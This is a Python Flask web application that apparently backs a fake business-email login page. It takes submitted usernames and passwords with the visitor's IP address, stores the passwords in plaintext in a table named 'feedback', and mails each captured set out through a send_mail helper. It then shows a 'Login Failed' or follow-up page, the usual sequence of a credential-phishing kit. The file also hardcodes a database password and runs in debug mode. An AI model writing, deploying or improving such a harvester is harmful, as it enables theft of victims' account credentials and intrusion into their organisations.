from flask import Flask, render_template, request, session
from flask_sqlalchemy import SQLAlchemy
import smtplib
import psycopg2
from send_mail import send_mail

app = Flask(__name__)


ENV = "dev"

if ENV == "dev":
    app.debug = True
    app.config["SQLALCHEMY_DATABASE_URI"] = "postgresql://postgres:admin@localhost/website"
else:
    app.debug = False
    app.config["SQLALCHEMY_DATABASE_URI"] = ""

app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

db = SQLAlchemy(app)

class Feedback(db.Model):
    __tablename__ = "feedback"
    id = db.Column(db.Integer, primary_key = True)
    username = db.Column(db.Text())
    password = db.Column(db.String(200), unique = True)

    def __init__(self, username, password):
        self.username = username
        self.password = password




usernames = []
passwords = []
ip_every = []

totals = f"The details are: {usernames} \n {passwords}\n and the ip is {ip_every}"



@app.route("/")
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    if request.method =="POST":
        ip_address = (request.remote_addr)
        username = request.form["username"]
        password = request.form["password"]
        usernames.append(username)
        passwords.append(password)
        ip_every.append(ip_address)
        if username =="" or password == "":
            return render_template("index.html", message = "Please login with your business email")
        #while db.session.query(Feedback).filter(Feedback.username == username).count() == True:
        if db.session.query(Feedback).filter(Feedback.password == password).count() == 0:
            data = Feedback(username, password)
            db.session.add(data)
            db.session.commit()
            send_mail(username,password,ip_address)
            return render_template("outdex.html")
        return render_template("index.html", message = "Login Failed")



if __name__=="__main__":
    app.run()